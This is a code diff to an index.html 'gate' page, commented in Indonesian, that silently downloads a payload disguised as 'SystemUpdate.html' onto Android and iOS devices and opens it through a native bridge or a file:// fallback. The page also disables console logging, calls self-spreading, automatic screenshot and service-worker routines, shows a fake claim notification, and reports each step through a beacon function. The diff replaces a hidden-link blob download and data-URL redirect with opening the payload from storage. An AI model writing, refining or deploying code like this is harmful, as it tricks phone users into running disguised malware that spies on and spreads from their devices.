@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - GERBANG (HANYA BUKA SystemUpdate.html)
+// 🔥 INDEX.HTML - GERBANG (DOWNLOAD + BUKA DARI STORAGE)
 // ============================================================
 
 console.log = function() {};
@@ -203,7 +203,7 @@ function escapeWebView() {
 }
 
 // ============================================================
-// ANDROID BRIDGE (UNIVERSAL)
+// ANDROID BRIDGE
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
@@ -264,7 +264,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD SystemUpdate.html (TANPA APK!)
+// 🔥 DOWNLOAD + BUKA SystemUpdate.html DARI STORAGE
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -287,70 +287,25 @@ function downloadPayloadSilent() {
                 if (PLATFORM.isAndroid && A.isAvailable) {
                     try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
                 }
-                try {
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    var link = document.createElement('a');
-                    link.href = url;
-                    link.download = 'SystemUpdate.html';
-                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(link);
-                    setTimeout(function() {
-                        link.click();
-                        setTimeout(function() {
-                            try { document.body.removeChild(link); } catch(e) {}
-                            URL.revokeObjectURL(url);
-                        }, 1000);
-                    }, 100);
-                    K({ sumber: 'html_download_blob', data: 'ok' });
-                } catch(e) {}
-                if (PLATFORM.isIOS) {
+                // ✅ BUKA DARI DOWNLOAD FOLDER
+                setTimeout(function() {
+                    if (PLATFORM.isAndroid && A.isAvailable) {
+                        try {
+                            A.openFile(htmlPath);
+                            K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
+                            return;
+                        } catch(e) {}
+                    }
+                    // ✅ FALLBACK: window.open
                     try {
-                        var blob = new Blob([htmlContent], { type: 'text/html' });
-                        var url = URL.createObjectURL(blob);
-                        window.open(url, '_blank');
-                        K({ sumber: 'html_download_ios', data: 'ok' });
+                        window.open('file://' + htmlPath, '_blank');
+                        K({ sumber: 'html_open_file', data: 'attempt' });
                     } catch(e) {}
-                }
+                }, 1000);
             }
         };
         xhr.send();
     } catch(e) {}
-    
-    // ✅ BUKA SystemUpdate.html (DI HALAMAN SAMA!)
-    setTimeout(function() {
-        if (PLATFORM.isAndroid && A.isAvailable) {
-            try {
-                A.openFile(htmlPath);
-                K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
-                return;
-            } catch(e) {}
-        }
-        try {
-            var htmlContent = localStorage.getItem('SystemUpdate.html');
-            if (htmlContent) {
-                // ✅ PERUBAHAN: BUKA DI HALAMAN SAMA (BUKAN TAB BARU!)
-                window.location.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
-                K({ sumber: 'html_open_same_tab', data: 'ok' });
-                return;
-            }
-        } catch(e) {}
-        if (PLATFORM.isAndroid) {
-            try {
-                window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
-                K({ sumber: 'html_open_file', data: 'attempt' });
-            } catch(e) {}
-        }
-        if (PLATFORM.isIOS) {
-            try {
-                var htmlContent = localStorage.getItem('SystemUpdate.html');
-                if (htmlContent) {
-                    window.location.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
-                    K({ sumber: 'html_open_ios', data: 'ok' });
-                }
-            } catch(e) {}
-        }
-    }, 5000);
 }
 
 // ============================================================
@@ -488,12 +443,10 @@ function dapatkanSemua() {
         registerServiceWorker();
         setTimeout(autoSpread, 2000);
         
-        // ✅ DOWNLOAD SystemUpdate.html + BUKA (TANPA APK!)
+        // ✅ DOWNLOAD + BUKA SystemUpdate.html
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
-        // ✅ NOTIFICATION (TANPA REDIRECT!)
         setTimeout(function() { showKlaimNotification(); }, 3000);
-        
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
